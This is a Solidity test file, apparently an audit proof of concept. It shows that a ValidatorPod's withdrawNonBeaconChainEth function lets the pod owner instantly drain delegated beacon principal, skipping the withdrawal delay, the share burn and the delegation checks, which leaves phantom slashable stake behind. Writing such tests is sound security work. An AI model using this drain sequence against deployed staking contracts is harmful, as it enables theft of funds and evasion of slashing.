// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { BeaconTestBase } from "./BeaconTestBase.sol";
import { ValidatorPod } from "../../src/beacon/ValidatorPod.sol";

/// @notice PoC: ValidatorPod.withdrawNonBeaconChainEth lets the pod owner drain ALL
///         pod ETH — including exited beacon principal already credited as beacon-pool
///         shares and delegated as slashable collateral — with NO withdrawal delay,
///         NO share burn, and NO delegation check. Escapes the slashing window and
///         leaves delegations backed by nothing.
contract PoCNonBeaconDrainTest is BeaconTestBase {
    function test_poc_withdrawNonBeaconChainEth_bypassesDelayAndDelegationLock() public {
        // Staker restakes 32 ETH; the validator has exited so the 32 ETH principal
        // physically sits in the pod and has been credited as beacon-pool shares.
        ValidatorPod pod = _createPodWithShares(podOwner1, 32 ether);
        vm.deal(address(pod), 32 ether);

        _registerOperator(operator1, MIN_OPERATOR_STAKE);

        // Delegate the full principal as slashable collateral to the operator.
        vm.prank(podOwner1);
        podManager.delegateTo(operator1, 32 ether);
        assertEq(podManager.operatorDelegatedStake(operator1), 32 ether, "32 ETH delegated/committed");

        // Owner instantly drains the pod via the "tips recovery" function:
        // no queueWithdrawal, no withdrawalDelayBlocks wait, no delegation gate.
        uint256 balBefore = podOwner1.balance;
        vm.prank(podOwner1);
        pod.withdrawNonBeaconChainEth(podOwner1, 32 ether);
        uint256 received = podOwner1.balance - balBefore;

        assertEq(received, 32 ether, "owner drained full pod principal instantly");
        assertEq(address(pod).balance, 0, "pod emptied");

        // Beacon shares and the delegation are completely untouched: the operator
        // still advertises 32 ETH of slashable stake backed by an empty pod, and the
        // owner kept their beacon-pool shares too.
        assertEq(podManager.getSharesUint(podOwner1), 32 ether, "beacon shares NOT burned");
        assertEq(podManager.operatorDelegatedStake(operator1), 32 ether, "PHANTOM delegated stake persists");
        assertEq(podManager.delegatorTotalDelegated(podOwner1), 32 ether, "delegation lock still 'active'");
    }
}
